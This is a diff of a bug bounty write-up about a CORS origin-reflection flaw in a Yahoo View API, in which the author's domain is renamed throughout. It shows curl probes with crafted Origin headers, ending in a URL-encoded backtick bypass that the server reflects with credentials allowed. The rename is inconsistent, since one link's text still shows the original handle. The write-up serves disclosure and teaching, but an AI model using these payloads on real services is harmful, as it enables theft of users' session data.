@@ -22,25 +22,25 @@ Access-Control-Allow-Credentials: true
 Access-Control-Allow-Origin: https://view.yahoo.com
 ```
 Since the server was reflecting the origin and with `Access-Control-Allow-Credentials)` set to `true`, if I could get the origin to be allowed, then I could steal data from the API.<br><br>
-First, I tried just sending a the origin `sxcurity.pro`:
+First, I tried just sending a the origin `C0RB3N.pro`:
 ```bash
-curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://sxcurity.pro'
+curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://C0RB3N.pro'
 ```
 The server responded without the Allow-Origin and Allow-Credentials.
 <br><br>
-Next, I tried sending `view.sxcurity.pro` as the origin:
+Next, I tried sending `view.C0RB3N.pro` as the origin:
 ```bash
-curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.sxcurity.pro'
+curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.C0RB3N.pro'
 ```
 Still nothing.<br><br>
-An idea came to mind, what if I tried `view.yahoo.com.sxcurity.pro`?
+An idea came to mind, what if I tried `view.yahoo.com.C0RB3N.pro`?
 ```bash
-curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com.sxcurity.pro'
+curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com.C0RB3N.pro'
 ```
-Voila! Still **DID NOT** respond with the Allow-Origin or ACAC. I had one more payload in mind: `view.yahoo.comsxcurity.pro`. I sent it and to my dismay, nothing had changed.
+Voila! Still **DID NOT** respond with the Allow-Origin or ACAC. I had one more payload in mind: `view.yahoo.comC0RB3N.pro`. I sent it and to my dismay, nothing had changed.
 <br><br><br>I was about to give up when I came up with the idea to send *two domains* in the origin header:
 ```bash
-curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com sxcurity.pro'
+curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com C0RB3N.pro'
 ```
 To my surprise the server responded with:
 ```bash
@@ -48,11 +48,11 @@ HTTP/1.1 200 OK
 Content-Type: application/json; charset=utf-8
 ------- snip -------
 Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: https://view.yahoo.com sxcurity.pro
+Access-Control-Allow-Origin: https://view.yahoo.com C0RB3N.pro
 ```
 I was intrigued and was trying to come up with a way that I could make this a valid domain name so I could exploit it. I tried adding some characters to replace the space between the two domains to see what the server responded with!
 ```bash
-curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com%sxcurity.pro'
+curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com%C0RB3N.pro'
 ```
 Response:
 ```bash
@@ -60,19 +60,19 @@ HTTP/1.1 200 OK
 Content-Type: application/json; charset=utf-8
 ------- snip -------
 Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: https://view.yahoo.com%sxcurity.pro
+Access-Control-Allow-Origin: https://view.yahoo.com%C0RB3N.pro
 ```
 This still wasn't exploitable because it wasn't valid.<br><br>
 After a bit of asking around, <a href="https://twitter.com/mattaustin">Matt Austin</a> linked me to one of his <a href="https://hackerone.com/reports/255991">HackerOne Reports</a> to Brave Software. <br><br>
 I decided to try using a **URL-Encoded backtick** / %60 since I saw it would be a valid subdomain (from his report) and I already saw that the origin was reflected when there was a percent sign.
 <br>I sent:
 ```bash
-curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com%60cdl.sxcurity.pro'
+curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com%60cdl.C0RB3N.pro'
 ```
 The server's response:
 ```bash
 Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: http://view.yahoo.com%60cdl.sxcurity.pro
+Access-Control-Allow-Origin: http://view.yahoo.com%60cdl.C0RB3N.pro
 ```
 Yes, it worked! I set up a wildcard on one of my domains in Route53. I opened up Firefox and visited http://view.yahoo.com%60cdl.hack-r.be and it didn't load! Yay, more problems. I tried in Chrome, IE, & Edge and it didn't work in them either. I got to a Mac and tried it in **Safari** and it finally worked!! HOWEVER, Apache decided it didn't like the request and to keep throwing a server error.<br><br>![problems](/images/problems-meme.jpg "Problems")<br><br>After playing around I decided to just create a simple server in NodeJS to serve my exploit page.<br>
 <br>
@@ -145,5 +145,5 @@ Thanks for reading,<br><br>
 - <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
 - <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
 - <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
-- <a class="link" href="https://github.com/sxcurity"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
+- <a class="link" href="https://github.com/C0RB3N"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
 
